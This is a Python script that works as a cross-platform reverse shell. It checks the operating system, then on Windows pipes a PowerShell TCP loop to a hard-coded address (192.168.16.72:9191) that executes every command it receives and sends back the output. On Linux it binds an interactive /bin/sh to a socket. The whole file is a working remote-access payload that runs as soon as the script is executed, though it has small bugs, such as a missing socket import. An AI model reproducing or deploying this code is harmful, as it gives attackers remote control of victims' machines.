import os
import subprocess
import sys

class Details:
    def __init__(self):
        self.os = os.name
        self.ip = "0.0.0.0"
        self.port = 9191

    
    ## FOR WINDOWS
    def windows(self):
        """Function is only work if the host has a Windows Operating system It will create a Reverse Shell"""

        ps_process = subprocess.Popen(["powershell", "-NoProfile", "-NoExit", "-Command", "-"],
                                      stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE,
                                      text=True)
        ##### THE COMMANDS
        command = [
            "$ip = '192.168.16.72'",  ###########CHANGE THE IP AS PER
            "$port = 9191",         #############CHANGE THE PORT
            "$tcpClient = New-Object System.Net.Sockets.TcpClient",
            "$tcpClient.Connect($ip, $port)",
            "$stream = $tcpClient.GetStream()",
            "$writer = New-Object System.IO.StreamWriter($stream)",
            "$reader = New-Object System.IO.StreamReader($stream)",
            "$writer.AutoFlush = $true",
            "while ($true) {",
            "    $input = $reader.ReadLine()",
            "    $output = Invoke-Expression $input 2>&1",
            "    $writer.WriteLine($output)",
            "}",
            "$tcpClient.Close()"
        ]  # The PowerShell commands to run

        combined_command = ";".join(command)

        # Run the PowerShell command and capture the output
        stdout, stderr = ps_process.communicate(input=combined_command)
        stderr = str(stderr)
        if stderr:
            print(f"Error: {stderr}")
        else:
            print(f"Output: {stdout}")

    #######LINUX###############
    def linux(self):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((self.ip,self.port))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        subprocess.call(["/bin/sh","-i"])
        
    
    

    ## TO IDENTIFY THE HOST OS
    def os_define(self):
        if self.os == "posix":
            print("It's a Unix-like operating system (e.g., Linux)")
            self.linux()

        elif self.os == "nt":
            print("It's a Windows-based operating system")
            self.windows()

        else:
            sys.exit()

    def print_details(self):
        print(f"Operating system: {self.os}")
        print(f"Build Number: {self.build_no}")

details = Details()
details.os_define()
details.print_details()
